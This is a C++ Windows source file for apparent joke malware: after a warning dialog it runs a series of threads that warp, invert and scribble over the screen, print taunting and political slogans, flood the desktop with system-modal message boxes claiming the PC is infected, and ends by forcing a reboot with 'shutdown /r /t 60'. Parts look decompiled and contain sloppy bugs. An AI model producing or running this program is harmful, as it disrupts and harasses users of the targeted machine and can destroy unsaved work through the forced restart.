#include <windows.h>
#include <iostream>
#define USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846
DWORD WINAPI sub_1(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	double rotaision = 0;
	while (true)
	{
		desk = GetDC(0);
		for (float i = 0; i < x + y; i += 0.99f)
		{
			int a = sin(rotaision) * 20;
			BitBlt(desk, i, 0, 1, y, desk, i, a, SRCCOPY);
			rotaision += M_PI / 80;
		}
	}
}
DWORD WINAPI sub_2(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	double rotaision = 0;
	while(true)
	{
		desk = GetDC(0);
		for(float i = 0; i < x + y;  i +=0.99f)
		{
			int a = sin(rotaision) * 20;
			BitBlt(desk, i, 0, 1, y,desk, i, a, SRCCOPY);
			rotaision += M_PI / 40;
		}
		for (float i1 = 0; i1 < x + y; i1 += 0.99f)
		{
			int a = sin(rotaision) * 20;
			BitBlt(desk, 0, i1, x, 1, desk, a, i1, SRCCOPY);
			rotaision += M_PI / 40;
		}
	}
}

DWORD WINAPI sub_8(LPVOID lpvd)
{
	HDC DC = GetDC(0);
	int v3;
	int v4 = 0;
	int v5;
	int v6;

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	v3 = w; //no idea why it sets this 
	v6 = h;

	
	if (v3 <= 0)
		v4 = 0;
	while (v4 < v3)
	{
		v5 = 0;
		if (h > 0)
		{
			while (v5 < v6)
			{
				StretchBlt(DC, v4, v5, 14, 14, DC, v4 + 4, v5 + 4, 10, 10, SRCCOPY);
				StretchBlt(DC, v4, v5, 14, 14, DC, v4, v5, 10, 10, SRCCOPY);
				h = v6;
				v5 += 10;
			}
			v3 = w;
		}
		v4 += 10;
	}
	return 0;
}

DWORD WINAPI sub_9(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	HWND hwnd = GetDesktopWindow();
	RECT rekt;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

	while (true)
	{
		GetWindowRect(hwnd, &rekt);
		StretchBlt(hdc, 25, 25, rekt.right - 50, rekt.bottom - 50, hdc, sw, sh, -sw, -sh, NOTSRCCOPY);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI sub_10(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	for (;;) 
	{
		SetBkMode(desk, 0);
		text = "Yor computer has been infected";
		text1 = "Ha-ha-ha-ha-ha-ha";
		text2 = "USA is bad contory!!!";
		text3 = "Russia is very good!!!";
		SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(desk, font);
		TextOutA(desk, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text3, strlen(text3));
		//Sleep(500);
		DeleteObject(font);
	}
}

DWORD WINAPI sub_11(LPVOID lpvd) 
{
	while(true)
	{
	
		HDC desk = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN),
			y = GetSystemMetrics(SM_CYSCREEN);
		POINT p1[3];
		p1[0].x = rand() % x;
		p1[0].y = rand() % y;
		p1[1].x = rand() % x;
		p1[1].y = rand() % y;
		p1[2].x = rand() % x;
		p1[2].y = rand() % y;
		HRGN gh = CreatePolygonRgn(p1, rand() % 5, ALTERNATE);
		HBRUSH hbr = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, hbr);
		PaintRgn(desk, gh);
		Sleep(10);
		
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		LineTo(desk, rand() % x, rand() % y);
		Sleep(10);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		
	}
}

DWORD WINAPI sub_12(LPVOID lpvd)
{
	int screen_w = GetSystemMetrics(0);
	int screen_h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	POINT pt;
	int xs = 100;
	int ys = 100;
	POINT p1;
	int steepcounter = 0;
	int soedbrush = 0;
	
	HDC v1; // r13
	int v2; // ebx
	__int64 v3; // rbp
	int v4; // edi
	int v5; // er14
	int v6; // er15
	int v7; // er12
	int v8; // eax
	int v9; // esi
	double v10; // xmm6_8
	HICON v11; // rdi
	float v12; // xmm1_4
	float v13; // xmm0_4
	int v15; // [rsp+98h] [rbp+10h]
	int v16; // [rsp+A0h] [rbp+18h]
	int x = 10;
	int y = 10;
	v1 = GetDC(0i64);
	v15 = GetSystemMetrics(0);
	v2 = v15;
	v3 = 32518i64;
	v4 = GetSystemMetrics(1);
	v16 = v4;
	double angle = 0;
	if (NULL != 1)
	{
		steepcounter += 1;
		//GetCursorPos(&pt);


		v5 = v15 / 10;
		do
		{
			v6 = rand() % v2;
			v7 = rand() % v4;
			v8 = rand() % 4;
			if (v8)
			{
				if (v8 == 1)
				{
					v3 = 32515i64;
				}
				else if (v8 == 3)
				{
					v3 = 32516i64;
				}
			}
			else
			{
				v3 = 32513i64;
			}
			v9 = M_PI;
			if (v5 > 0)
			{
				x += incrementor * signX;
				y += incrementor * signY;
				do
				{
					v10 = (double)(v9 + 300);
					v11 = LoadIconW(0i64, (LPCWSTR)v3);
					v12 = sin((double)(v9)) * (double)v9 + 300;
					v13 = cos((double)(v9)) * (double)v9 + 300;
					DrawIcon(v1, x - (int)v13, y - (int)v12, v11);
					//Sleep(0);
					if (NULL == 1)
						break;
					v9 += 1;
				} while (v9 < v5);
				v2 = v15;
				v4 = v16;
			}

			if (y == GetSystemMetrics(SM_CYSCREEN))
			{
				signY = -1;
			}

			if (x == GetSystemMetrics(SM_CXSCREEN))
			{
				signX = -1;
			}

			if (y == 0)
			{
				signY = 1;
			}

			if (x == 0)
			{
				signX = 1;
			}

			InvalidateRect(0i64, 0i64, 0);
		} while (NULL != 1);
	}
}

VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
}
VOID WINAPI ci1(int x1, int y1, int w1, int h1)
{
	HDC hdc = GetDC(0);

	BitBlt(hdc, x1, y1, w1, h1, hdc, x1, y1, NOTSRCCOPY);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI sub_7(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	int w1 = rect.right - rect.left, h1 = rect.bottom - rect.top;


	for (int t = 0;; t++)
	{
		const int size = 700;
		const int size1 = 700;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		int x1 = rand() % (w1 + size1) - size1 / 2, y1 = rand() % (h1 + size1) - size1 / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			ci1(x1 - i / 2, y1 - i / 2, i, i);
			Sleep(25);
		}
	}
}

DWORD WINAPI sub_100(LPVOID lpvd)
{

	int x = 100;
	int y = 100;
	int x1 = 100;
	int y1 = 100;
	int screen_w = GetSystemMetrics(0);
	int screen_h = GetSystemMetrics(1);
	int w = x + 100;
	int h = y + 100;
	int w1 = x1 + 100;
	int h1 = x1 + 100;
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	POINT pt;
	int xs = 100;
	int ys = 100;
	POINT p1;
	int steepcounter = 0;
	int soedbrush = 0;

	HBRUSH hold;
	HRGN hrgn;
	HRGN hrgn1;
	HPEN h2;
	HDC desk = GetDC(NULL);
	hold = CreateSolidBrush(0xff);
	while (true)
	{
		steepcounter += 1;
		GetCursorPos(&pt);

		x += incrementor * signX;
		y += incrementor * signY;
		w += incrementor * signX;
		h += incrementor * signY;
		x1 += incrementor * signX1;
		y1 += incrementor * signY1;
		w1 += incrementor * signX1;
		h1 += incrementor * signY1;

		desk = GetDC(NULL);
		h2 = CreatePen(0, 2, 0xffffff);

		if (steepcounter == 20)
		{
			soedbrush += 1;
			switch (soedbrush)
			{
			case 1:
				hold = CreateSolidBrush(0xa5ff);
				break;
			case 2:
				hold = CreateSolidBrush(0xffff);
				break;
			case 3:
				hold = CreateSolidBrush(0xff00);
				break;
			case 4:
				hold = CreateSolidBrush(0xffff00);
				break;
			case 5:
				hold = CreateSolidBrush(0xff0000);
				break;
			case 6:
				hold = CreateSolidBrush(0xd30094);
				break;
			case 7:
				hold = CreateSolidBrush(0xff00ff);
				break;
			case 8:
				hold = CreateSolidBrush(0xff);
				soedbrush = 0;
				break;
			}
			steepcounter = 0;
		}

		SelectObject(desk, hold);
		SelectObject(desk, h2);
		Ellipse(desk, x, y, w, h);
		//PaintRgn(desk, hrgn);
		//PaintRgn(desk, hrgn1);
		if (h == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (w == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
	}
	
}

DWORD WINAPI sub_5(LPVOID lpvd)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	HDC desckMem = CreateCompatibleDC(desk); 
	for (;;) {
		desk = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + rand() % sw;
		wPt[0].y = wRect.top - rand() % sh;
		wPt[1].x = wRect.right - rand() % sw;
		wPt[1].y = wRect.top + rand() % sh;
		wPt[2].x = wRect.left * rand() % sw;
		wPt[2].y = wRect.bottom + rand() % sh;
		PlgBlt(desk, wPt, desk, 0, 0, sw, sh, 0, 0, 0);
		BitBlt(desk, 0, 0, sw, sh, desckMem, 0, 0, !(rand() % 2) ? !(rand() % 2) ? SRCAND : SRCPAINT : !(rand() % 2) ? !(rand() % 2) ? SRCINVERT : SRCPAINT : !(rand() % 2) ? SRCAND : !(rand() % 2) ? SRCERASE : NOTSRCERASE);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&wRect); DeleteObject(&wPt);
	}
}

DWORD WINAPI sub_6(LPVOID lpvd)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;

	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh + x ^ y >> sw / sh, t = y ^ y | x >> sw;
			rgbtriple[i].rgbtBlue += t + GetBValue(x ^ y | t) * M_PI;
			rgbtriple[i].rgbtRed += x + GetRValue(t ^ y | x) * M_PI;
			rgbtriple[i].rgbtGreen += y + GetGValue(x ^ t | y) * M_PI;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}

DWORD WINAPI sub_4(LPVOID lpvd)
{
	HDC getsa = GetDC(0);
	POINT pt;
	int x = GetSystemMetrics(SM_CXICON) / 2;
	int y = GetSystemMetrics(SM_CYICON) / 2;
	while(true)
	{
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - x, pt.y - y, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(getsa, pt.x - 50, pt.y - 50, LoadIcon(NULL, IDI_ASTERISK));
		DrawIcon(getsa, pt.x - 100, pt.y - 100, LoadIcon(NULL, IDI_APPLICATION));
		DrawIcon(getsa, pt.x - 150, pt.y - 150, LoadIcon(NULL, IDI_WARNING));
		DrawIcon(getsa, pt.x - 200, pt.y - 200, LoadIcon(NULL, IDI_QUESTION));
	}
}

DWORD WINAPI sub_3(LPVOID lpvd)
{
	int v4; // [rsp+58h] [rbp-18h]
	int y; // [rsp+5Ch] [rbp-14h]
	int v6; // [rsp+60h] [rbp-10h]
	int v7; // [rsp+64h] [rbp-Ch]
	HDC hdc; // [rsp+68h] [rbp-8h]
	hdc = GetDC(0i64);
	while (1)
	{
		v7 = GetSystemMetrics(1);
		v6 = GetSystemMetrics(0);
		y = rand() % v7;
		v4 = rand() % 5;
		if (v4)
		{
			if (v4 == 1)
				BitBlt(hdc, 0, y, v6, 15, hdc, 1, y, 0xCC0020u);
		}
		else
		{
			BitBlt(hdc, 1, y, v6, 15, hdc, 0, y, 0xCC0020u);
		}
	}
}
HCRYPTPROV prov1;

int random1() {

	if (prov1 == NULL)
		if (!CryptAcquireContext(&prov1, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov1, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random1() % (w - pcs->cx);
			int y = random1() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

#include <cmath>

//#include "file_pc.h"

#pragma  comment(lib,"WinMM.lib")

#include <cstdlib>


#include <stdlib.h>




#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>
//void strReverseW(LPWSTR str);


#include <iostream>

#include <stdlib.h>

//#include "effect.cpp"

#include <mmsystem.h>

using namespace std;

#include <intrin.h>

//#include <Windows.h>
#include <WinNT.h>
#include <stdint.h>




POINT mkp(int x, int y) {
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}
DWORD WINAPI MessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	string Message;
	for (int i = 0; i < 20; i++) {
		Message[i] = (char)(33 + random1() % 94);
	}
	MessageBox(NULL, L"Your PC has Ben f***** by MR.Duglas", L"LOL", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI MSGBX(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &MessageThread, NULL, NULL, NULL);
		Sleep(500);
	}
}

DWORD WINAPI _MSG(LPVOID parameter) {
	MessageBox(NULL, L"", L"TOO LATE", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	return 0;
}



int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(d), int(c))
{	
	int message = MessageBox(NULL, L"Warning! If you are reading this message then you have the choice to stay with your computer with or without it if you click Yes in this dialog box then you will never turn on your computer again If you click no then you will live happily ever after with it", L"WARNING! This is malware!", MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL);
	switch (message)
	{
	case IDNO:
	{
		exit(0);
	}
	}
	HANDLE Sub01;
	Sub01 = CreateThread(0, 0, sub_1, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub01, NULL);
	CloseHandle(Sub01);
	HANDLE Sub02;
	Sub02 = CreateThread(0, 0, sub_2, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub02, NULL);
	CloseHandle(Sub02);
	HANDLE Sub03;
	Sub03 = CreateThread(0, 0, sub_3, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub03, NULL);
	CloseHandle(Sub03);
	HANDLE Sub04;
	Sub04 = CreateThread(0, 0, sub_4, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub04, NULL);
	CloseHandle(Sub04);
	HANDLE Sub05;
	Sub05 = CreateThread(0, 0, sub_5, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub05, NULL);
	CloseHandle(Sub05);
	HANDLE Sub06;
	Sub06 = CreateThread(0, 0, sub_6, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub06, NULL);
	CloseHandle(Sub06);
	HANDLE Sub07;
	Sub07 = CreateThread(0, 0, sub_7, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub07, NULL);
	CloseHandle(Sub07);
	HANDLE Sub08;
	Sub08 = CreateThread(0, 0, sub_8, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub08, NULL);
	CloseHandle(Sub08);
	HANDLE Sub09;
	Sub09 = CreateThread(0, 0, sub_9, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub09, NULL);
	CloseHandle(Sub09);
	HANDLE Sub10;
	Sub10 = CreateThread(0, 0, sub_10, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub10, NULL);
	CloseHandle(Sub10);
	HANDLE Sub11;
	Sub11 = CreateThread(0, 0, sub_11, 0, 0, 0);
	Sleep(10000);
	TerminateThread(Sub11, NULL);
	CloseHandle(Sub11);
	HANDLE Sub012;
	Sub012 = CreateThread(0, 0, sub_12, 0, 0, 0);
	Sleep(20000);
	TerminateThread(Sub012, NULL);
	CloseHandle(Sub012);
	HANDLE Sub00;
	Sub00 = CreateThread(0, 0, MSGBX, 0, 0, 0);
	Sleep(20000);
	system("shutdown /r /t 60");
}
